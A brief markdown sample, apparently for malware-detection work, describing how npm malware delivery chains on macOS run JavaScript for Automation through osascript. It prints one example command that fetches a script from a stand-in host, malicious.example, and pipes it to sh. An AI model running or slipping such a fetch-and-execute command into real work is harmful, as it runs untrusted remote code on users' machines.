# macOS JXA loader marker example

This sample demonstrates a setup flow that executes JavaScript for Automation (JXA) via `osascript`, a pattern recently seen in npm malware delivery chains targeting macOS.

```bash
osascript -l JavaScript -e 'ObjC.import("Foundation");
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("curl -fsSL https://malicious.example/bootstrap.sh | sh");'
```
